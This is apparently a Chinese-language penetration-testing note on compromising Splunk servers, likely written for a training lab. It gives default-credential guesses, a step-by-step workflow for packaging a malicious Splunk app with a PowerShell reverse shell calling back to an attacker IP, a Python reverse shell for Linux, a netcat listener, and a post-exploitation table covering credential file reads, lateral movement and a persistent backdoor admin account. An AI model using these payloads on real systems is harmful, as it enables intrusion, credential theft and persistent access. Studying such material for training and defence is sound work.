---
description: >-
  我們在評估過程中經常會看到 Splunk，尤其是在大型企業環境中的內部滲透測試期間。我們也曾見過它暴露在外部，但是這種情況比較少見。 Splunk
  不存在太多可利用的漏洞，並且能夠快速修補任何問題。在評估期間，Splunk 的最大關注點是弱身份驗證或空身份驗證，因為 Splunk
  的管理員存取權限使我們能夠部署自訂應用程序，這些應用程式可用於快速入侵 Splunk 伺服器，並且根據 Splunk
---

# Splunk

## <mark style="color:red;">**1. 發現點**</mark>

* **Nmap 掃描**：

```bash
nmap -p8000,8089 -sV <target>
```

> 開放 8000（Web UI）、8089（REST API）

* 嘗試登入：

```
http://splunk.inlanefreight.local:8000
```

* 常見弱密碼：\
  `admin:changeme`、`admin:Welcome1`、`admin:password123`
* 如果試用版過期 → 轉成 **Splunk Free**，無需身份驗證！
* 如果成功登入，就可以上傳 App、執行 Python、PowerShell 腳本。

## <mark style="color:red;">**2.**</mark> 濫用內建功能

> Splunk 允許安裝「自訂 App」，而 App 裏面可以包含 `inputs.conf` 指定定時執行 script。
>
> #### (A) Clone 攻擊模板 Repo：
>
> ```bash
> git clone https://github.com/0xjpuff/reverse_shell_splunk.git
> ```
>
> > 裏面已經有好用嘅 Splunk App 結構同示範反向 shell 腳本。
>
> ***
>
> #### (B) 編輯反向 shell 腳本
>
> 進入目錄：
>
> ```bash
> cd reverse_shell_splunk/reverse_shell_splunk/bin
> ```
>
> 用你鍾意嘅編輯器開 `run.ps1`：
>
> ```powershell
> # 找到 attacker_ip_here、attacker_port_here
> # 改成你本機 IP 同 port
> $client = New-Object System.Net.Sockets.TCPClient("PWNIP",PWNPO)
> ```
>
> ⚠ 例子：
>
> ```powershell
> $client = New-Object System.Net.Sockets.TCPClient("10.10.14.15",443)
> ```
>
> ***
>
> #### (C) 檢查 `inputs.conf`
>
> `reverse_shell_splunk/reverse_shell_splunk/default/inputs.conf` 應該長這樣：
>
> ```
> [script://.\bin\run.bat]
> disabled = 0
> interval = 10
> sourcetype = shell
> ```
>
> * 代表 Splunk 會每 10 秒執行 `run.bat`，
> * 而 `run.bat` 會調用 `run.ps1`，執行 PowerShell 反彈 shell。
>
> ***
>
> #### (D) 打包成 splunk app 檔案：
>
> ```bash
> tar -cvzf updater.tar.gz reverse_shell_splunk/
> ```
>
> ***
>
> ### 3️⃣ 上傳 & 觸發
>
> * 開瀏覽器登入 Splunk：
>
> ```
> http://splunk.<target>.local:8000
> ```
>
> * Splunk 一啟用 App，就會執行 `inputs.conf` 指定腳本。
>
>

*   選：**Manage Apps → Install app from file → 選 updater.tar.gz → Upload**

    <figure><img src="../../../.gitbook/assets/螢幕截圖 2025-03-19 16.00.37.png" alt="" width="200"><figcaption></figcaption></figure>

***

#### (E) 開啟監聽器：

```bash
sudo nc -lnvp 443
```

> 然後登入 Splunk Web UI\
> App → Manage Apps → Install App from File\
> 上傳 `updater.tar.gz`

* App 被啟用後，每 10 秒會執行腳本，Netcat 會接收到 SYSTEM 權限反彈 shell。

***

### 3️⃣ Linux 系統同樣方法

* 改 `rev.py` 成 Python 反向 shell：

```python
import socket,os,pty
s=socket.socket()
s.connect(("你的IP",443))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn("/bin/bash")
```

* 同樣打包 splunk\_shell 資料夾，透過 Web UI 上傳，即可 RCE。

## <mark style="color:red;">3. Splunk CVE 利用方向</mark>

* Splunk 曾有 SSRF 漏洞（可繞過 API 權限）
* CVE-2018-11409：可以利用 dashboard XML 文件進行 RCE
* 如果 REST API 無需驗證，可以用 API 呼叫將惡意 App 上傳或注入 script

## <mark style="color:red;">4. 連鎖漏洞</mark>

| 已取得 RCE 後可以做嘅事 | 操作                                                           |
| -------------- | ------------------------------------------------------------ |
| Windows 主機     | 檢查 `whoami` → 如果 SYSTEM 權限，即可嘗試 dump 域憑證                     |
| 搜索域帳號 / 密碼     | `dir C:\Program Files\Splunk\etc\` 找 config，有可能 plaintext 密碼 |
| Linux 主機       | `cat /opt/splunk/etc/passwd` 文件（存 local users hash）          |
| 內網掃描           | 使用 `ping`、`nmap`、`net view`、`net group /domain`              |
| 橫向移動           | 試試用抓到嘅憑證 WinRM / RDP / SMB                                   |
| 提權             | `schtasks /query` 或 `wmic` 查有冇可寫服務                           |
| 持久化            | 建立新 admin 使用者 `net user pwned P@ssw0rd /add`                 |
